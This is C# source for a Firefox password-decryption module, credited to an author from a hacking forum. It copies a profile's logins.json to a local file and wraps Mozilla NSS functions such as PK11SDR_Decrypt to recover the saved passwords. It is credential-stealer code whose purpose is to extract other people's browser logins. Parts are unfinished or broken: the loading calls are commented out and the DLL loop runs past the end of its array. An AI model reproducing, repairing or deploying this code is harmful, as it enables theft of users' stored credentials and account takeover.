using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

/*
   #Developer by Antlion [XakFor.Net]  
*/

namespace MozillaDecrypt
{
    public class DecMozilla
    {
        private static IntPtr _nssModule { get; set; }

        public static void GetNewPassword()
        {
            using (var sr = new StreamReader(Path.Combine(PathFireFox.GetRandomFF(), "logins.json")))
            {
                Newtonsoft.Json.JsonConvert.DeserializeObject<dynamic>((sr.ReadToEnd()));
            }
            File.AppendAllText("Json.txt",(File.ReadAllText(Path.Combine(PathFireFox.GetRandomFF(), "logins.json"))));
        }

        public static void InitializeDelegates()
        {
            string[] Massive = new string[] 
            {
                "msvcp120.dll", "msvcr120.dll",
                "mozglue.dll", "msvcp140.dll",
                "softokn3.dll", "nssutil3.dll",
                "nspr4.dll", "nssutil3.dll",
                "mozsqlite3.dll","plc4.dll",
                "plds4.dll"
            };

            try
            {
                for (var i = 0; i <= Massive.Length; i++)
                {
                    if (File.Exists(Path.Combine(PathFireFox.GetRegistryFireFox(), Massive[i])))
                    {
                       // NativeMethods.SetDllDirectory(Path.Combine(PathFireFox.GetRegistryFireFox())); // TEST
                      //  NSS_Init(Path.Combine(PathFireFox.GetRegistryFireFox())); // TEST
                        Console.WriteLine(Path.Combine(PathFireFox.GetRegistryFireFox(), Massive[i]));
                        Console.WriteLine(Path.Combine(PathFireFox.GetRegistryFireFox(), "nss3.dll"));
                        // LoadDLL(string.Concat(PathFireFox.GetRegistryFireFox(), Massive[i]));
                        // _nssModule = LoadDLL(Path.Combine(PathFireFox.GetRegistryFireFox(), @"\nss3.dll"));
                    }
                }
            }
            catch { }
           // PK11_Authenticate(PK11_GetInternalKeySlot(), true, 0);
        }

        private static IntPtr LoadDLL(string PathLibrary)
        {
            if (string.IsNullOrEmpty(PathLibrary))
            {
                throw new ArgumentNullException("libPath");
            }
            IntPtr moduleHandle = NativeMethods.LoadLibrary(PathLibrary);
            if (moduleHandle == IntPtr.Zero)
            {
                var lasterror = Marshal.GetLastWin32Error();
                var innerEx = new Win32Exception(lasterror);
                innerEx.Data.Add("LastWin32Error", lasterror);

                throw new Exception($"can't load DLL {PathLibrary}", innerEx);
            }
            return moduleHandle;
        }

        public static string Decrypt(string cipherText)
        {
            var sb = new StringBuilder(cipherText);
            var tSecDec = new Structures.TSECItem();
            Structures.TSECItem item = Marshal.PtrToStructure<Structures.TSECItem>(new IntPtr(NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length)));
 
            if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    byte[] bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.UTF8.GetString(bvRet);
                }
            }
 
            return null;
        }

        public string NewDecrypt(string cypherText)
        {
            var inStr = new StringBuilder(cypherText);
            var result = new Structures.TSECItem();
            var structure = (Structures.TSECItem)Marshal.PtrToStructure
            (
                new IntPtr(NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length)), typeof(Structures.TSECItem)
            );
            if ((uint)PK11SDR_Decrypt(ref structure, ref result, 0) > 0U || result.SECItemLen == 0)
            {
                return null;
            }

            var numArray = new byte[result.SECItemLen];
            Marshal.Copy(new IntPtr(result.SECItemData), numArray, 0, result.SECItemLen);
            return Encoding.UTF8.GetString(numArray);
        }

        public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            return ((NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer
            (
                NativeMethods.GetProcAddress(_nssModule, nameof(NSSBase64_DecodeBuffer)), typeof(NSSBase64_DecodeBufferPtr))
            )
            (arenaOpt, outItemOpt, inStr, inLen);
        }

        public static long NSS_Init(string configdir)
        {
            return Marshal.GetDelegateForFunctionPointer<NSS_InitPtr>
            (
                NativeMethods.GetProcAddress(_nssModule, "NSS_Init")
            )
            (configdir);
        }

        public static int PK11SDR_Decrypt(ref Structures.TSECItem data, ref Structures.TSECItem result, int cx)
        {
            return ((PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer
            (
                NativeMethods.GetProcAddress(_nssModule, nameof(PK11SDR_Decrypt)), typeof(PK11SDR_DecryptPtr))
            )
            (ref data, ref result, cx);
        }

        public static long PK11_GetInternalKeySlot()
        {
            return ((PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer
            (
                NativeMethods.GetProcAddress(_nssModule, nameof(PK11_GetInternalKeySlot)), typeof(PK11_GetInternalKeySlotPtr))
            )();
        }

        public static void PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            var num = ((PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer
            (
                NativeMethods.GetProcAddress(_nssModule, nameof(PK11_Authenticate)), typeof(PK11_AuthenticatePtr))
            )
            (slot, loadCerts, wincx);
        }

        #region Delegates

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NSS_InitPtr(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11SDR_DecryptPtr(ref Structures.TSECItem data, ref Structures.TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        #endregion

    }
}